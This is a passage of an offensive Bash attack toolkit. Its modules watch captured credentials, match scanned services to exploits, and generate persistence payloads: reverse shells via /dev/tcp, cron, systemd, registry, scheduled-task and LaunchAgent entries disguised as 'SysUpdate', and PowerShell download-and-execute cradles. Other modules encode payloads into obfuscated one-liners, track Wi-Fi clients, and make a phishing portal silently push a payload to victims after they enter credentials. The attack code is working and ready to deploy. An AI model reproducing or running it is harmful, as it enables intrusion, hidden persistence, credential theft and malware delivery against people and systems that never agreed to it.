                local sig; sig=$(md5sum "$f" 2>/dev/null | awk '{print $1}')
                local key="$f|$sig"
                if ! echo "$seen" | grep -qF "$key"; then
                    seen="$seen
$key"
                    local last; last=$(tail -1 "$f" 2>/dev/null)
                    [ -n "$last" ] && printf "\a${GREEN}[+] cred: %s → %s${NC}\n" "$(basename "$f")" "$last"
                fi
            done
            sleep 5
        done
    ) &
    VAULT_WATCH_PID=$!
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# AUTO-EXPLOIT SUGGESTER v1
# Reads an nmap XML, matches each service against searchsploit
# AND msf module list, prints ranked module candidates.
# ===============================================================

_auto_exploit_run() {
    local xml="$1"
    if [ ! -f "$xml" ]; then
        echo -e "${RED}[!] XML not found: $xml${NC}"
        return 1
    fi

    echo ""
    echo -e "${BOLD}${CYAN}========= AUTO EXPLOIT MATCH =========${NC}"
    echo -e "${DIM}    Matching services from $(basename "$xml") against searchsploit...${NC}"
    echo ""

    local searchsploit_ok=1
    command -v searchsploit >/dev/null 2>&1 || searchsploit_ok=0

    # parse services out of XML using python (most portable)
    local services
    services=$(python3 - "$xml" << 'PYEOF'
import sys, xml.etree.ElementTree as ET
try:
    tree = ET.parse(sys.argv[1])
except Exception:
    sys.exit(1)
root = tree.getroot()
for host in root.iter('host'):
    ip = ''
    for a in host.iter('address'):
        if a.get('addrtype') == 'ipv4':
            ip = a.get('addr')
    for p in host.iter('port'):
        state = p.find('state')
        if state is None or state.get('state') != 'open':
            continue
        svc = p.find('service')
        if svc is None:
            print("%s|%s|unknown|" % (ip, p.get('portid')))
            continue
        name = svc.get('name') or 'unknown'
        product = svc.get('product') or ''
        version = svc.get('version') or ''
        print("%s|%s|%s|%s %s" % (ip, p.get('portid'), name, product, version))
PYEOF
)

    if [ -z "$services" ]; then
        echo -e "${YELLOW}[!] No services parsed from XML.${NC}"
        return 1
    fi

    # score and print
    local out="$(_sess_dir)/scans/auto_exploit_$(date +%s).txt"
    {
        echo "=== Auto exploit match for $xml ==="
        echo "Date: $(date)"
        echo ""
    } > "$out"

    local count=0
    while IFS='|' read -r ip port name version; do
        [ -z "$ip" ] && continue
        count=$((count+1))
        echo -e "${BOLD}${CYAN}┌─ $ip:$port  $name  $version${NC}"
        echo "--- $ip:$port  $name  $version ---" >> "$out"

        if [ $searchsploit_ok -eq 1 ]; then
            local q="$name"
            [ -n "$version" ] && q="$name $version"
            local hits
            hits=$(searchsploit "$q" 2>/dev/null | grep -E "^[^ ]" | grep -vE "^(----------------------------------------|Shellcodes)" | head -6)
            if [ -n "$hits" ]; then
                echo -e "${YELLOW}  searchsploit:${NC}"
                echo "$hits" | sed 's/^/    /'
                echo "$hits" >> "$out"
            fi
        fi

        # msf search — slow, only do it for interesting ports
        case "$port" in
            21|22|23|25|80|110|139|443|445|1433|1521|2049|3306|3389|5432|5900|6379|8080|8443|27017)
                if command -v msfconsole >/dev/null 2>&1; then
                    local msfq="$name"
                    [ -n "$version" ] && msfq="$name $version"
                    local msfhits
                    msfhits=$(timeout 30 msfconsole -q -x "search $msfq; exit" 2>/dev/null \
                        | grep -E "^[0-9]+  " | head -5)
                    if [ -n "$msfhits" ]; then
                        echo -e "${GREEN}  msf modules:${NC}"
                        echo "$msfhits" | sed 's/^/    /'
                        echo "msf: $msfhits" >> "$out"
                    fi
                fi
                ;;
        esac

        echo -e "${BOLD}${CYAN}└─${NC}"
        echo "" >> "$out"
    done <<< "$services"

    echo ""
    echo -e "${GREEN}[+] $count services analyzed.${NC}"
    echo -e "${GREEN}[+] Report: $out${NC}"
}

# hook: run auto-exploit after any nmap XML is produced
_auto_exploit_hook() {
    local xml="$1"
    echo ""
    read -p "$(echo -e ${YELLOW}'Run auto-exploit match now? [Y/n]: '${NC})" GO
    GO="${GO:-y}"
    if [ "$GO" = "y" ] || [ "$GO" = "Y" ]; then
        _auto_exploit_run "$xml"
    fi
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# PERSISTENCE PACKAGE GENERATOR v1
# Given LHOST + LPORT, generates ready-to-deploy persistence
# payloads for Linux and Windows: cron, systemd, .bashrc, ssh keys,
# registry run key, scheduled task, start folder.
# ===============================================================

_persist_gen() {
    local lhost="$1" lport="$2" outdir="$3"
    [ -z "$lhost" ] && { echo -e "${RED}[!] LHOST required${NC}"; return 1; }
    [ -z "$lport" ] && lport="4444"
    [ -z "$outdir" ] && outdir="$(_sess_dir)/persist"

    mkdir -p "$outdir/linux" "$outdir/windows" "$outdir/macos"
    local stamp; stamp=$(date +%s)

    # ---- LINUX: bash reverse shell wrapper ----
    cat > "$outdir/linux/reverse.sh" <<EOF
#!/bin/bash
# call home to $lhost:$lport
nohup bash -i >& /dev/tcp/$lhost/$lport 0>&1 &
exit 0
EOF
    chmod +x "$outdir/linux/reverse.sh"

    # ---- LINUX: cron entry ----
    cat > "$outdir/linux/cron.txt" <<EOF
# install with: crontab -l | cat - cron.txt | crontab -
@reboot /bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'
*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'
EOF

    # ---- LINUX: systemd unit ----
    cat > "$outdir/linux/systemd.service" <<EOF
# install as /etc/systemd/system/sysupdate.service
# then: systemctl daemon-reload && systemctl enable --now sysupdate
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

    # ---- LINUX: .bashrc line ----
    cat > "$outdir/linux/bashrc.txt" <<EOF
# append to ~/.bashrc
(bash -i >& /dev/tcp/$lhost/$lport 0>&1 &) 2>/dev/null
EOF

    # ---- LINUX: authorized_keys ----
    if [ -f "$HOME/.ssh/id_rsa.pub" ]; then
        cp "$HOME/.ssh/id_rsa.pub" "$outdir/linux/authorized_keys.txt" 2>/dev/null
    else
        cat > "$outdir/linux/authorized_keys.txt" <<EOF
# Generate a keypair first: ssh-keygen -t ed25519 -f persist_key
# Then append persist_key.pub contents here
# Then on target: mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys
EOF
    fi

    # ---- WINDOWS: powershell reverse ----
    cat > "$outdir/windows/reverse.ps1" <<EOF
# call home to $lhost:$lport
\$c = New-Object System.Net.Sockets.TCPClient('$lhost', $lport)
\$s = \$c.GetStream()
[byte[]]\$b = 0..65535 | %{0}
while ((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0) {
    \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b, 0, \$i)
    \$sb = (iex \$d 2>&1 | Out-String)
    \$sb2 = \$sb + 'PS ' + (pwd).Path + '> '
    \$sbt = ([text.encoding]::ASCII).GetBytes(\$sb2)
    \$s.Write(\$sbt, 0, \$sbt.Length)
    \$s.Flush()
}
\$c.Close()
EOF

    # ---- WINDOWS: registry run key ----
    cat > "$outdir/windows/reg_run.reg" <<EOF
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"SysUpdate"="powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://$lhost:$lport/p.ps1')\""
EOF

    # ---- WINDOWS: scheduled task ----
    cat > "$outdir/windows/scheduled_task.bat" <<EOF
@echo off
schtasks /create /tn "SysUpdate" /tr "powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://$lhost:$lport/p.ps1')\"" /sc onlogon /ru %USERNAME% /f
EOF

    # ---- WINDOWS: startup folder ----
    cat > "$outdir/windows/startup_drop.bat" <<EOF
@echo off
copy reverse.ps1 "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.ps1"
EOF

    # ---- MACOS: launchagent ----
    cat > "$outdir/macos/launchagent.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.sysupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i >& /dev/tcp/$lhost/$lport 0>&1</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>
EOF

    # ---- MACOS: cron ----
    cat > "$outdir/macos/cron.txt" <<EOF
@reboot /bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'
EOF

    # ---- summary ----
    {
        echo "Persistence package generated $(date)"
        echo "LHOST=$lhost LPORT=$lport"
        echo ""
        echo "Linux:   $outdir/linux/"
        echo "Windows: $outdir/windows/"
        echo "macOS:   $outdir/macos/"
        echo ""
        echo "Deploy notes:"
        echo "  cron:        crontab -l | cat - linux/cron.txt | crontab -"
        echo "  systemd:     cp linux/systemd.service /etc/systemd/system/sysupdate.service"
        echo "               systemctl daemon-reload && systemctl enable --now sysupdate"
        echo "  bashrc:      cat linux/bashrc.txt >> ~/.bashrc"
        echo "  authorized:  mkdir -p ~/.ssh && cat linux/authorized_keys.txt >> ~/.ssh/authorized_keys"
        echo "  windows reg: reg import windows/reg_run.reg"
        echo "  windows task: schtasks /create /tn SysUpdate /tr ... /sc onlogon /f"
        echo "  mac plist:   cp macos/launchagent.plist ~/Library/LaunchAgents/"
        echo "               launchctl load ~/Library/LaunchAgents/launchagent.plist"
    } > "$outdir/README.txt"

    echo -e "${GREEN}[+] Persistence package: $outdir${NC}"
    echo -e "${DIM}    Linux / Windows / macOS ready${NC}"
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# PAYLOAD ENCODER — turns any payload into a ready-to-run one-liner
# Base64, hex, gzip+b64, URL double, UTF-16LE for powershell
# ===============================================================

_payload_wrap() {
    local payload="$1"
    local mode="$2"      # bash | python | powershell | cmd | curl | all
    [ -z "$payload" ] && { echo -e "${RED}[!] no payload${NC}"; return 1; }

    local b64; b64=$(printf '%s' "$payload" | base64 -w0)
    local hex; hex=$(printf '%s' "$payload" | xxd -p | tr -d '\n')
    local gz64; gz64=$(printf '%s' "$payload" | gzip -c | base64 -w0)
    local url; url=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$payload")
    local url2; url2=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(urllib.parse.quote(sys.argv[1])))" "$payload")
    local rot13; rot13=$(printf '%s' "$payload" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
    local rev; rev=$(printf '%s' "$payload" | rev)
    local ps_utf16; ps_utf16=$(printf '%s' "$payload" | iconv -f UTF-8 -t UTF-16LE 2>/dev/null | base64 -w0)

    echo ""
    echo -e "${BOLD}${CYAN}========= ENCODED FORMS =========${NC}"

    echo -e "${BOLD}${YELLOW}--- Base64 ---${NC}"
    echo "$b64"
    echo ""

    echo -e "${BOLD}${YELLOW}--- Hex ---${NC}"
    echo "$hex"
    echo ""

    echo -e "${BOLD}${YELLOW}--- Gzip + Base64 ---${NC}"
    echo "$gz64"
    echo ""

    echo -e "${BOLD}${YELLOW}--- URL ---${NC}"
    echo "$url"
    echo ""

    echo -e "${BOLD}${YELLOW}--- URL (double) ---${NC}"
    echo "$url2"
    echo ""

    echo -e "${BOLD}${YELLOW}--- ROT13 ---${NC}"
    echo "$rot13"
    echo ""

    echo -e "${BOLD}${YELLOW}--- Reversed ---${NC}"
    echo "$rev"
    echo ""

    echo -e "${BOLD}${GREEN}========= READY-TO-RUN WRAPPERS =========${NC}"

    echo -e "${BOLD}${LIME}--- Bash (base64) ---${NC}"
    echo "bash -c \"\$(echo '$b64' | base64 -d)\""
    echo ""

    echo -e "${BOLD}${LIME}--- Bash (gzip+base64) ---${NC}"
    echo "bash -c \"\$(echo '$gz64' | base64 -d | gzip -d)\""
    echo ""

    echo -e "${BOLD}${LIME}--- Python (base64) ---${NC}"
    echo "python3 -c \"import base64;exec(base64.b64decode('$b64'))\""
    echo ""

    echo -e "${BOLD}${SKY}--- PowerShell (EncodedCommand UTF-16LE) ---${NC}"
    if [ -n "$ps_utf16" ]; then
        echo "powershell -EncodedCommand $ps_utf16"
    else
        echo -e "${DIM}    (iconv missing, skipping UTF-16LE conversion)${NC}"
    fi
    echo ""

    echo -e "${BOLD}${SKY}--- PowerShell (base64 via FromBase64String) ---${NC}"
    echo "powershell -w hidden -c \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$b64')) | iex\""
    echo ""

    echo -e "${BOLD}${VIOLET}--- cmd.exe (certutil download+run) ---${NC}"
    echo "certutil -urlcache -f http://LHOST:$LPORT/payload.b64 %TEMP%\\p.b64 && certutil -decode %TEMP%\\p.b64 %TEMP%\\p.bat && %TEMP%\\p.bat"
    echo ""

    echo -e "${BOLD}${PINK}--- curl pipe to bash ---${NC}"
    echo "curl -s http://LHOST:$LPORT/payload.sh | bash"
    echo ""

    echo -e "${BOLD}${PINK}--- wget pipe to sh ---${NC}"
    echo "wget -qO- http://LHOST:$LPORT/payload.sh | sh"
    echo ""
}

# pipe an entire generated shell into the encoder
_payload_encode_pipe() {
    local input="$1"
    _payload_wrap "$input" all
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# NETWORK TOPOLOGY MAP v1
# Reads ARP table + nmap XML, prints ASCII tree of the network:
# gateway → subnets → hosts with OS guess and open ports.
# ===============================================================

_topo_build() {
    local iface="${1:-$INTERFACE}"
    [ -z "$iface" ] && { echo -e "${RED}[!] no interface${NC}"; return 1; }

    echo ""
    echo -e "${BOLD}${CYAN}========= NETWORK TOPOLOGY =========${NC}"

    local myip mymac gw gwmac
    myip=$(ip -4 -o addr show "$iface" 2>/dev/null | awk '{print $4}' | head -1 | cut -d/ -f1)
    mymac=$(cat /sys/class/net/"$iface"/address 2>/dev/null)
    gw=$(ip route show dev "$iface" 2>/dev/null | awk '/^default/ {print $3; exit}')
    [ -z "$gw" ] && gw=$(ip route | awk '/^default/ {print $3; exit}')
    gwmac=$(ip neigh show "$gw" 2>/dev/null | awk '{print $5}' | head -1)

    echo -e "${BOLD}${GREEN}[my host]${NC}  $myip   ($iface / $mymac)"
    echo -e "    │"
    echo -e "    ├── gateway:  ${BOLD}${YELLOW}${gw:-none}${NC}   (${gwmac:-unknown MAC})"
    echo -e "    │"

    # collect neighbors from ARP cache
    local hosts=()
    while read -r ip _ mac _ rest; do
        [ -z "$ip" ] && continue
        case "$ip" in *:*) continue ;; esac
        [[ ! "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && continue
        [ "$ip" = "$myip" ] && continue
        [ "$ip" = "$gw" ] && continue
        hosts+=("$ip|$mac")
    done < <(ip neigh show dev "$iface" 2>/dev/null)

    # sort by IP
    local sorted
    sorted=$(printf '%s\n' "${hosts[@]}" | sort -t. -k4 -n)

    local total="${#hosts[@]}"
    local idx=0
    while IFS='|' read -r ip mac; do
        [ -z "$ip" ] && continue
        idx=$((idx+1))
        local connector="├──"
        [ "$idx" = "$total" ] && connector="└──"

        # guess device type from MAC
        local vendor=""
        if [ -n "$mac" ]; then
            vendor=$(timeout 1 curl -s "https://api.macvendors.com/$mac" 2>/dev/null | head -c 60)
            [ -z "$vendor" ] && vendor=$(lan_fingerprint_mac "$mac" 2>/dev/null | head -c 60)
        fi

        # quick port probe
        local ports=""
        for p in 22 80 443 445 554 3389 5555 62078; do
            timeout 1 nc -z "$ip" "$p" 2>/dev/null && ports="$ports $p"
        done

        echo -e "    $connector ${BOLD}${YELLOW}$ip${NC}   ${DIM}$mac${NC}"
        [ -n "$vendor" ] && echo -e "         vendor: $vendor"
        [ -n "$ports" ] && echo -e "         ports: $ports"
    done <<< "$sorted"

    echo ""
    echo -e "${BOLD}${CYAN}====================================${NC}"
    echo -e "  Interface:  $iface"
    echo -e "  My IP:      $myip"
    echo -e "  Gateway:    ${gw:-none}"
    echo -e "  Hosts:      ${#hosts[@]} neighbors"
    echo -e "${BOLD}${CYAN}====================================${NC}"
}

# read an nmap XML and overlay port data on top of the topology
_topo_from_xml() {
    local xml="$1"
    [ ! -f "$xml" ] && { echo -e "${RED}[!] XML not found${NC}"; return 1; }

    echo ""
    echo -e "${BOLD}${CYAN}===== TOPOLOGY from $(basename "$xml") ====="

    python3 - "$xml" << 'PYEOF'
import sys, xml.etree.ElementTree as ET
try:
    root = ET.parse(sys.argv[1]).getroot()
except Exception as e:
    print("[!]", e); sys.exit(1)

for host in root.iter('host'):
    ip = mac = hostname = ""
    status = "unknown"
    for s in host.iter('status'):
        status = s.get('state', 'unknown')
    for a in host.iter('address'):
        if a.get('addrtype') == 'ipv4':
            ip = a.get('addr')
        elif a.get('addrtype') == 'mac':
            mac = a.get('addr')
    for h in host.iter('hostname'):
        hostname = h.get('name', '')
    ports = []
    for p in host.iter('port'):
        st = p.find('state')
        if st is None or st.get('state') != 'open':
            continue
        svc = p.find('service')
        name = svc.get('name') if svc is not None else '?'
        prod = (svc.get('product') or '') if svc is not None else ''
        ver  = (svc.get('version') or '') if svc is not None else ''
        ports.append("%s/%s %s %s" % (p.get('portid'), name, prod, ver))
    if status == 'up':
        print("  %-16s  %-18s  %s" % (ip, mac or '-', hostname or '-'))
        for pp in ports:
            print("      -> " + pp)
PYEOF
    echo -e "${BOLD}${CYAN}====================================${NC}"
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# WIFI CLIENT TRACKER v1
# Background scan updates a cache of every AP + client seen.
# Menus read from the cache. Refreshes every 30s.
# ===============================================================

WIFI_TRACKER_PID=""
WIFI_TRACKER_DIR="$BASE_DIR/tracker"
WIFI_TRACKER_APS="$WIFI_TRACKER_DIR/aps.txt"
WIFI_TRACKER_CLIENTS="$WIFI_TRACKER_DIR/clients.txt"
WIFI_TRACKER_CACHE="$WIFI_TRACKER_DIR/last_update.txt"

_wifi_track_start() {
    local iface="${1:-$MONITOR_ACTUAL}"
    [ -z "$iface" ] && iface="$MONITOR"
    mkdir -p "$WIFI_TRACKER_DIR"

    # kill any previous instance
    _wifi_track_stop

    (
        while true; do
            # make sure monitor mode is on
            if ! iw dev "$iface" info 2>/dev/null | grep -q "type monitor"; then
                sleep 5
                continue
            fi

            # short 20s scan
            rm -f /tmp/track_out-01.csv
            sudo timeout 20 airodump-ng "$iface" --band abg \
                --output-format csv -w /tmp/track_out >/dev/null 2>&1

            local csv="/tmp/track_out-01.csv"
            if [ -f "$csv" ]; then
                # parse: AP section ends with blank line, then stations
                python3 - "$csv" > "$WIFI_TRACKER_DIR/scan.json" << 'PYEOF'
import sys, csv, json
rows = []
with open(sys.argv[1], 'r', errors='ignore') as f:
    for line in f:
        rows.append(line.rstrip('\n'))
aps = []
clients = []
mode = 'aps'
for line in rows:
    if line.strip() == '':
        mode = 'clients'
        continue
    parts = [p.strip() for p in line.split(',')]
    if mode == 'aps' and len(parts) >= 14:
        bssid = parts[0]
        if ':' not in bssid: continue
        aps.append({
            'bssid': bssid,
            'channel': parts[3],
            'power': parts[8],
            'privacy': parts[5],
            'essid': parts[13]
        })
    elif mode == 'clients' and len(parts) >= 6:
        mac = parts[0]
        if ':' not in mac: continue
        clients.append({
            'mac': mac,
            'power': parts[3],
            'bssid': parts[5].strip(),
            'probes': ','.join(parts[6:]).strip()
        })
print(json.dumps({'aps': aps, 'clients': clients}))
PYEOF

                # flatten to txt for easy grep
                python3 -c "
import json, sys
d = json.load(open('$WIFI_TRACKER_DIR/scan.json'))
with open('$WIFI_TRACKER_APS','w') as f:
    for a in d['aps']:
        f.write('%s|%s|%s|%s|%s\n' % (a['bssid'], a['channel'], a['power'], a['privacy'], a['essid']))
with open('$WIFI_TRACKER_CLIENTS','w') as f:
    for c in d['clients']:
        f.write('%s|%s|%s|%s\n' % (c['mac'], c['power'], c['bssid'], c['probes']))
" 2>/dev/null
                date '+%Y-%m-%d %H:%M:%S' > "$WIFI_TRACKER_CACHE"
            fi

            sleep 10
        done
    ) &
    WIFI_TRACKER_PID=$!
    echo -e "${GREEN}[+] tracker started (pid $WIFI_TRACKER_PID)${NC}"
}

_wifi_track_stop() {
    if [ -n "$WIFI_TRACKER_PID" ]; then
        kill "$WIFI_TRACKER_PID" 2>/dev/null
        kill -9 "$WIFI_TRACKER_PID" 2>/dev/null
        WIFI_TRACKER_PID=""
    fi
    # also kill any stragglers
    pkill -9 -f "track_out" 2>/dev/null
    pkill -9 -f "airodump-ng.*track" 2>/dev/null
}

_wifi_track_status() {
    if [ -n "$WIFI_TRACKER_PID" ] && kill -0 "$WIFI_TRACKER_PID" 2>/dev/null; then
        echo "running"
    else
        echo "stopped"
    fi
}

_wifi_track_show() {
    print_banner
    menu_header "W I F I   T R A C K E R"
    local status; status=$(_wifi_track_status)
    local last="never"
    [ -f "$WIFI_TRACKER_CACHE" ] && last=$(cat "$WIFI_TRACKER_CACHE")
    phb_row "  Status:      $status" "$([ "$status" = "running" ] && echo "${BOLD}${GREEN}" || echo "${BOLD}${RED}")"
    phb_row "  Last update: $last" "${BOLD}${CYAN}"
    phb_row "  Cache dir:   $WIFI_TRACKER_DIR" "${DIM}${GREY}"
    phb_div
    if [ -f "$WIFI_TRACKER_APS" ]; then
        local n_ap; n_ap=$(wc -l < "$WIFI_TRACKER_APS")
        phb_row "  APs seen:      $n_ap" "${BOLD}${ORANGE}"
    fi
    if [ -f "$WIFI_TRACKER_CLIENTS" ]; then
        local n_cli; n_cli=$(wc -l < "$WIFI_TRACKER_CLIENTS")
        phb_row "  Clients seen:  $n_cli" "${BOLD}${PINK}"
    fi
    phb_div
    phb_row "  [1]  Start tracker" "${BOLD}${GREEN}"
    phb_row "  [2]  Stop tracker" "${BOLD}${RED}"
    phb_row "  [3]  Show cached APs" "${BOLD}${CYAN}"
    phb_row "  [4]  Show cached clients" "${BOLD}${CYAN}"
    phb_row "  [0]  Back" "${RED}"
    menu_footer
    read -p "Choice: " TC
    case "$TC" in
        0) return ;;
        1) _wifi_track_start; addon_wait ;;
        2) _wifi_track_stop; echo -e "${GREEN}[+] stopped${NC}"; addon_wait ;;
        3) if [ -f "$WIFI_TRACKER_APS" ]; then
               echo ""
               printf "  ${BOLD}%-20s %-4s %-6s %-6s %s${NC}\n" "BSSID" "CH" "PWR" "SEC" "ESSID"
               echo "  ----------------------------------------------------------"
               while IFS='|' read -r b ch p s e; do
                   [ -z "$b" ] && continue
                   printf "  ${YELLOW}%-20s${NC} ${CYAN}%-4s${NC} %-6s %-6s ${GREEN}%s${NC}\n" "$b" "$ch" "$p" "$s" "${e:-<hidden>}"
               done < "$WIFI_TRACKER_APS"
               echo ""
           else
               echo -e "${YELLOW}[!] No data yet — start the tracker first.${NC}"
           fi
           addon_wait ;;
        4) if [ -f "$WIFI_TRACKER_CLIENTS" ]; then
               echo ""
               printf "  ${BOLD}%-20s %-6s %-20s %s${NC}\n" "CLIENT MAC" "PWR" "ASSOC BSSID" "PROBES"
               echo "  ----------------------------------------------------------"
               while IFS='|' read -r m p b pr; do
                   [ -z "$m" ] && continue
                   printf "  ${YELLOW}%-20s${NC} %-6s ${CYAN}%-20s${NC} ${DIM}%s${NC}\n" "$m" "$p" "$b" "$pr"
               done < "$WIFI_TRACKER_CLIENTS"
               echo ""
           else
               echo -e "${YELLOW}[!] No data yet — start the tracker first.${NC}"
           fi
           addon_wait ;;
        *) sleep 1 ;;
    esac
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# PORTAL PAYLOAD DROP v1
# After a victim submits creds on the phishing portal,
# serve them a "you're connected" page that silently
# triggers a payload download (or a redirect).
# ===============================================================

PORTAL_DROP_FILE=""
PORTAL_DROP_MODE="silent"   # silent | redirect | both
PORTAL_DROP_URL=""

_portal_drop_set_file() {
    local f="$1"
    if [ -f "$f" ]; then
        PORTAL_DROP_FILE="$f"
        echo -e "${GREEN}[+] drop file: $f${NC}"
    else
        echo -e "${RED}[!] not found: $f${NC}"
    fi
}

_portal_drop_set_mode() {
    local m="$1"
    case "$m" in
        silent|redirect|both) PORTAL_DROP_MODE="$m"; echo -e "${GREEN}[+] mode: $m${NC}" ;;
        *) echo -e "${RED}[!] mode must be silent|redirect|both${NC}" ;;
    esac
}

_portal_drop_config() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "P O R T A L   P A Y L O A D   D R O P"
        local cur_file="${PORTAL_DROP_FILE:-none}"
        [ -n "$PORTAL_DROP_FILE" ] && cur_file=$(basename "$PORTAL_DROP_FILE")
        phb_row "  Drop file:   $cur_file" "${BOLD}${CYAN}"
        phb_row "  Mode:        $PORTAL_DROP_MODE" "${BOLD}${CYAN}"
        phb_row "  Redirect to: ${PORTAL_DROP_URL:-none}" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [1]  Pick drop file (payload to serve)" "${BOLD}${GREEN}"
        phb_row "  [2]  Set mode (silent/redirect/both)" "${BOLD}${GREEN}"
        phb_row "  [3]  Set redirect URL (for redirect mode)" "${BOLD}${GREEN}"
        phb_row "  [4]  Clear config" "${BOLD}${YELLOW}"
        phb_row "  [5]  Show drop config" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "Choice: " PC
        case "$PC" in
            0) return ;;
            1) read -p "Path to payload file: " f; _portal_drop_set_file "$f"; addon_wait ;;
            2) read -p "Mode [silent|redirect|both]: " m; _portal_drop_set_mode "$m"; addon_wait ;;
            3) read -p "Redirect URL (e.g. https://google.com): " u; PORTAL_DROP_URL="$u"; echo -e "${GREEN}[+] set${NC}"; addon_wait ;;
            4) PORTAL_DROP_FILE=""; PORTAL_DROP_URL=""; PORTAL_DROP_MODE="silent"; echo -e "${GREEN}[+] cleared${NC}"; addon_wait ;;
            5) echo ""; echo "drop_file = $PORTAL_DROP_FILE"; echo "mode      = $PORTAL_DROP_MODE"; echo "redirect  = $PORTAL_DROP_URL"; addon_wait ;;
            *) sleep 1 ;;
        esac
    done
}

# generate the post-cred HTML with the payload hook embedded
_portal_drop_generate_html() {
    local out="$1"
    [ -z "$PORTAL_DROP_FILE" ] && { echo -e "${YELLOW}[!] no drop file configured, using plain success page${NC}"; }

    local dl_url=""
    if [ -n "$PORTAL_DROP_FILE" ]; then
        dl_url="http://$PORTAL_IP/$PORTAL_DROP_BASENAME"
    fi

    cat > "$out" <<HTMLEOF
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Connected</title>
<style>
body{font-family:system-ui;background:#eef2f7;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#fff;padding:32px 28px;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,.1);max-width:380px;text-align:center}
.check{font-size:48px;color:#22c55e;margin-bottom:12px}
h1{font-size:20px;margin:0 0 8px}
p{color:#6b7280;font-size:14px;margin:0}
</style></head>
<body>
<div class="card">
<div class="check">✓</div>
<h1>You are now connected</h1>
<p>Network access granted. Enjoy your browsing.</p>
</div>
HTMLEOF

    if [ -n "$PORTAL_DROP_FILE" ] && [ "$PORTAL_DROP_MODE" != "redirect" ]; then
        # silent iframe download
        cat >> "$out" <<HTMLEOF
<iframe src="http://$PORTAL_IP/$PORTAL_DROP_BASENAME" style="display:none"></iframe>
HTMLEOF
    fi

    if [ -n "$PORTAL_DROP_URL" ] && { [ "$PORTAL_DROP_MODE" = "redirect" ] || [ "$PORTAL_DROP_MODE" = "both" ]; }; then
        cat >> "$out" <<HTMLEOF
<script>setTimeout(function(){window.location.href="$PORTAL_DROP_URL";},2000);</script>
HTMLEOF
    fi

    cat >> "$out" <<HTMLEOF
</body></html>
HTMLEOF
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# SCHEDULER v1
# Run commands on a schedule. Uses systemd user timers if available,
# falls back to a detached at-style loop.
# ===============================================================

SCHED_DIR="$BASE_DIR/sched"
SCHED_JOBS="$SCHED_DIR/jobs"
mkdir -p "$SCHED_JOBS" 2>/dev/null

_sched_add() {
    local name="$1" when="$2" cmd="$3"
    [ -z "$name" ] || [ -z "$when" ] || [ -z "$cmd" ] && {
        echo -e "${RED}[!] usage: _sched_add NAME WHEN COMMAND${NC}"
        return 1
    }
    name=$(echo "$name" | tr -c 'a-zA-Z0-9_-' '_')
    local f="$SCHED_JOBS/$name.sh"
    cat > "$f" <<EOF
#!/bin/bash
# job: $name
# schedule: $when
# created: $(date)
# command:
$cmd
EOF
    chmod +x "$f"

    # register with crontab
    local cronline="$when $f >> $SCHED_DIR/$name.log 2>&1"
    ( crontab -l 2>/dev/null | grep -v "$f" ; echo "$cronline" ) | crontab -
    echo -e "${GREEN}[+] job $name scheduled: $when${NC}"
    echo -e "${DIM}    script: $f${NC}"
    echo -e "${DIM}    log:    $SCHED_DIR/$name.log${NC}"
}

_sched_remove() {
    local name="$1"
    name=$(echo "$name" | tr -c 'a-zA-Z0-9_-' '_')
    local f="$SCHED_JOBS/$name.sh"
    ( crontab -l 2>/dev/null | grep -v "$f" ) | crontab - 2>/dev/null
    rm -f "$f" "$SCHED_DIR/$name.log"
    echo -e "${GREEN}[+] removed $name${NC}"
}

_sched_list() {
    echo ""
    if [ -d "$SCHED_JOBS" ]; then
        local found=0
        for f in "$SCHED_JOBS"/*.sh; do
            [ ! -f "$f" ] && continue
            found=1
            local name; name=$(basename "$f" .sh)
            local when; when=$(grep '^# schedule:' "$f" | sed 's/^# schedule: *//')
            local log="$SCHED_DIR/$name.log"
            local last="never"
            [ -f "$log" ] && last=$(stat -c %y "$log" 2>/dev/null | cut -d. -f1)
            printf "  ${BOLD}%-20s${NC}  ${CYAN}%-20s${NC}  last run: ${DIM}%s${NC}\n" "$name" "$when" "$last"
        done
